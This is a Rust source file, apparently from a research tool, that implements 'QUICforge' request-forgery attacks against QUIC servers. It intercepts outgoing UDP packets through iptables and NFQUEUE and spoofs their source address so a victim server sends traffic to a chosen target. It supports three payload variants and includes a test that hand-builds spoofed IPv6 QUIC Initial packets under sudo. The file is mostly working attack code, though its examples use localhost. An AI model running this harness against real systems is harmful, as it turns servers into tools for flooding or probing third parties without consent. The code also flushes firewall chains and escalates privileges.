#![allow(clippy::doc_markdown)]
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};

use std::future::{join, Future};

use color_eyre::eyre::{eyre, Context, Result};

use iptables::IPTables;
use log::info;
use nfq::Queue;

use crate::{
    client::Client,
    packets::spoof_packet,
    payload::Payload,
};

pub const DEFAULT_CLIENT_PORT: u16 = 5001;
pub const DEFAULT_SERVER_NAME: &str = "localhost";
pub const LOCALHOST_V4: IpAddr = IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1));
pub const LOCALHOST_V6: IpAddr = IpAddr::V6(Ipv6Addr::new(0, 0, 0, 0, 0, 0, 0, 1));

/// Wrapper around IPTables and NetfilterQueue
pub struct PacketFilter {
    /// IPTables interface
    ipt: IPTables,
}

impl PacketFilter {
    pub fn new(is_ipv6: bool) -> Result<Self> {
        let ipt = iptables::new(is_ipv6)
            .map_err(|err| eyre!("Failed to instantiate IPtables object: {}", err))?;

        Ok(PacketFilter { ipt })
    }

    /// Return a NetfilterQueue that packets to `target_addr` address redirected to
    pub fn redirect_to(&mut self, target_addr: SocketAddr, queue_num: u16) -> Result<Queue> {
        let mut nfq = Queue::open()?;

        nfq.bind(queue_num)?;

        nfq.set_copy_range(queue_num, 0xffff)?;

        let ip = target_addr.ip();
        let port = target_addr.port();

        let rule = [
            format!("-d {ip}"),
            format!("-p udp --dport {port}"),
            format!("-j NFQUEUE --queue-num {queue_num}"),
        ]
        .join(" ");

        self.ipt
            .append("filter", "OUTPUT", &rule)
            .map_err(|err| eyre!("Failed to add IPtables rule: {}", err))?;

        Ok(nfq)
    }

    /// Clear IPTables rules
    pub fn clear(&mut self) -> Result<()> {
        self.ipt
            .flush_chain("filter", "OUTPUT")
            .map_err(|err| eyre!("Failed to flush IPtables chain: {}", err))
    }
}

/// Execute QUICforge attacks.
///
///
/// # Example
///
/// ```rust
/// use hephaestus_core::network::Harness;
/// use hephaestus_core::payload::Payload;
/// use hephaestus_core::clients::QuinnClient;
///
/// #[tokio::main]
/// async fn main() {
///     // There should be a QUIC server running at this address.
///     let victim_addr = "127.0.0.1:4433".parse().unwrap();
///
///     let target_addr = "127.0.0.1:1234".parse().unwrap();
///
///     let mut harness = Harness::<QuinnClient>::new(victim_addr, target_addr).unwrap(); 
///
///     let payload = Payload::Vnrf {
///         dcid: vec![2; 20],
///         scid: vec![3; 20],
///         version: 0x1337_1337,
///     };
///
///     harness.run(payload).await.unwrap();
/// }
///
/// ```
/// See `tests` directory for full examples including setting up a dummy target.
pub struct Harness<T: Client> {
    /// IPtables interface
    filter: PacketFilter,

    /// Netfilter queue that receives packets sent to `victim_addr`
    nfq: Queue,

    /// Address of victim QUIC server
    victim_addr: SocketAddr,

    /// Address of target server
    target_addr: SocketAddr,

    /// QUIC client
    client: T,
}

impl<T: Client> Harness<T> {
    /// Creates a new instance. Opens a netfilter queue and binds it to the appropriate queue
    /// number (1).
    pub fn new(victim_addr: SocketAddr, target_addr: SocketAddr) -> Result<Self> {
        // All addresses need to use the same IP version
        if victim_addr.is_ipv4() != target_addr.is_ipv4() {
            return Err(eyre!(
                "Invalid addresses: victim_addr is IPv{}, but target_addr is IPv{}",
                if victim_addr.is_ipv4() { 4 } else { 6 },
                if target_addr.is_ipv4() { 4 } else { 6 },
            ));
        }

        // Find a free client port
        // TODO: this is disgusting, make it better
        let mut client_port = DEFAULT_CLIENT_PORT;
        while client_port == victim_addr.port() || client_port == target_addr.port() {
            client_port += 1;
        }

        let client_addr = if victim_addr.is_ipv4() {
            SocketAddr::new(LOCALHOST_V4, client_port)
        } else {
            SocketAddr::new(LOCALHOST_V6, client_port)
        };

        info!("Client address: {client_addr}.");

        let mut filter = PacketFilter::new(victim_addr.is_ipv6())?;
        filter.clear()?;

        let nfq = filter.redirect_to(victim_addr, 1)?;

        Ok(Self {
            filter,
            nfq,
            victim_addr,
            target_addr,
            client: T::new(client_addr)?,
        })
    }

    /// Execute QUICforge attack.
    ///
    /// Performs the attack for a given payload.
    pub async fn run(&mut self, payload: Payload) -> Result<()> {
        info!("Initiate handshake.");
        // Initiate QUIC handshake
        let handshake_fut = self.client.connect(self.victim_addr, DEFAULT_SERVER_NAME, payload.clone());

        let attack_fut = async {
            match payload {
                Payload::Sirf { .. } | Payload::Vnrf { .. } => {
                    // Retrieve captured message from netfilterqueue
                    let mut msg = self.nfq.recv()
                        .map_err(|err| eyre!("{err}")
                        .wrap_err("Error receiving packet from netfilterqueue."))?;

                    info!("Intercepted client hello.");

                    // Overwrite source address and port
                    spoof_packet(msg.get_payload_mut(), self.target_addr)
                        .wrap_err("Failed to spoof packet.")?;

                    // Forward message to victim
                    msg.set_verdict(nfq::Verdict::Accept);
                    self.nfq.verdict(msg)?;

                    info!("Sent spoofed packet to victim.");

                    Ok(())
                },
                Payload::Cmrf { threshold, .. } => {
                    let max_packet_num = 50;
                    let mut packet_num = 0;
                    while packet_num < max_packet_num {
                        // Retrieve captured message from netfilterqueue
                        let mut msg = self.nfq.recv()
                            .map_err(|err| eyre!("{err}")
                            .wrap_err("Error receiving packet from netfilterqueue."))?;

                        info!("Intercepted packet.");

                        packet_num += 1;

                        if packet_num > threshold {
                            // Overwrite source address and port
                            spoof_packet(msg.get_payload_mut(), self.target_addr)
                                .wrap_err("Failed to spoof packet.")?;
                        }

                        // Forward message to victim
                        msg.set_verdict(nfq::Verdict::Accept);
                        self.nfq.verdict(msg)?;

                        info!("Sent spoofed packet to victim.");
                    }

                    Ok(())
                },
            }
        };

        let (_, attack_result) = join!(handshake_fut, attack_fut).await;

        attack_result
    }

    pub fn spoof_initial_packet(&mut self, payload: Payload) -> Result<()> {
        // Retrieve captured message from netfilterqueue
        let mut msg = self.nfq.recv()
            .map_err(|err| eyre!("{err}")
            .wrap_err("Error receiving packet from netfilterqueue."))?;

        info!("Intercepted client hello.");

        // Overwrite source address and port
        spoof_packet(msg.get_payload_mut(), self.target_addr)
            .wrap_err("Failed to spoof packet.")?;

        // Forward message to victim
        msg.set_verdict(nfq::Verdict::Accept);
        self.nfq.verdict(msg)?;

        info!("Sent spoofed packet to victim.");

        Ok(())
    }

    pub fn is_ipv4(&self) -> bool {
        self.victim_addr.is_ipv4()
    }

    pub fn is_ipv6(&self) -> bool {
        self.victim_addr.is_ipv6()
    }
}

impl<T: Client> Drop for Harness<T> {
    fn drop(&mut self) {
        self.filter.clear()
            .expect("Failed to flush iptables while dropping harness");
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use bytes::{Bytes, BytesMut};
    use color_eyre::eyre::Result;
    use pnet::{
        packet::{
            ethernet::{EtherTypes, Ethernet, MutableEthernetPacket},
            ipv6::{Ipv6, MutableIpv6Packet},
            udp::MutableUdpPacket,
        },
        util::MacAddr,
    };
    use quinn_proto::ConnectionId;
    use simplelog::{ColorChoice, Config, LevelFilter, TermLogger, TerminalMode};

    use pnet::packet::ip::IpNextHeaderProtocols;
    use pnet::packet::udp::{ipv6_checksum, Udp};

    use pnet::datalink::{self, Channel, NetworkInterface};

    use quinn_proto::packet::PacketNumber;

    #[test]
    fn udp_stuff() -> Result<()> {
        TermLogger::init(
            LevelFilter::Info,
            Config::default(),
            TerminalMode::Mixed,
            ColorChoice::Auto,
        )
        .unwrap();
        color_eyre::install()?;

        sudo::escalate_if_needed().unwrap();

        let interfaces = datalink::interfaces();

        // Get loopback interface
        let interface = interfaces
            .into_iter()
            .find(|iface: &NetworkInterface| iface.name == "lo")
            .unwrap_or_else(|| panic!("loopback interface not found"));

        // Create a channel to send stuff (hopefully)
        let (mut tx, mut rx) = match datalink::channel(&interface, datalink::Config::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("hephaestus: unhandled channel type"),
            Err(e) => panic!("hephaestus: unable to create channel: {e}"),
        };

        let quic_params = Payload::Vnrf {
            scid: vec![2; 20],
            dcid: vec![7; 20],
            version: 0x1337_1337,
        };

        let header = quinn_proto::packet::Header::Initial {
            number: PacketNumber::U8(0),
            src_cid: ConnectionId::new(&vec![2; 20]),
            dst_cid: ConnectionId::new(&vec![7; 20]),
            token: Bytes::new(),
            version: 0x1337_1337,
        };

        // Derive keys for protected spoofed header
        let client_keys = quinn_proto::crypto::rustls::initial_keys(
            rustls::quic::Version::V1,
            header.dst_cid(),
            quinn_proto::Side::Client,
        );

        let mut buf = BytesMut::new();

        // Build spoofed packet
        let encode = header.encode(&mut buf);
        let header_len = buf.len();
        buf.resize(header_len + 16 + client_keys.packet.local.tag_len(), 0);
        encode.finish(
            &mut buf,
            &*client_keys.header.local,
            Some((0, &*client_keys.packet.local)),
        );

        info!("QUIC packet size: {:?}", buf.len());

        let udp_length = buf.len() + 8;

        let target_ip = "::1".parse().unwrap();
        let victim_ip = "::1".parse().unwrap();

        let target_port = 4433;
        let victim_port = 5001;

        let udp = Udp {
            source: target_port,
            destination: victim_port,
            length: u16::try_from(udp_length)?,
            checksum: 0,
            payload: buf.to_vec(),
        };

        assert_eq!(udp_length, MutableUdpPacket::packet_size(&udp));

        let mut buf = BytesMut::zeroed(udp_length);

        let mut udp_packet = MutableUdpPacket::new(&mut buf).unwrap();
        udp_packet.populate(&udp);

        let checksum = ipv6_checksum(&udp_packet.to_immutable(), &target_ip, &victim_ip);
        udp_packet.set_checksum(checksum);

        let ip = Ipv6 {
            version: 6,
            traffic_class: 0,
            flow_label: 0x1234,
            payload_length: u16::try_from(udp_length)?,
            next_header: IpNextHeaderProtocols::Udp,
            hop_limit: 17,
            source: target_ip,
            destination: victim_ip,
            payload: buf.to_vec(),
        };

        let ip_size = MutableIpv6Packet::packet_size(&ip);

        buf.clear();
        buf.resize(ip_size, 0);

        let mut ip_packet = MutableIpv6Packet::new(&mut buf).unwrap();
        ip_packet.populate(&ip);

        let ethernet = Ethernet {
            destination: MacAddr::zero(),
            source: MacAddr::zero(),
            ethertype: EtherTypes::Ipv6,
            payload: buf.to_vec(),
        };

        let ethernet_size = MutableEthernetPacket::packet_size(&ethernet);
        buf.resize(ethernet_size, 0);

        let mut ethernet_packet = MutableEthernetPacket::new(&mut buf).unwrap();
        ethernet_packet.populate(&ethernet);

        info!("Packet size: {:?}", ethernet_size);

        tx.send_to(&buf, None);

        info!("{:?}", rx.next());

        Ok(())
    }
}
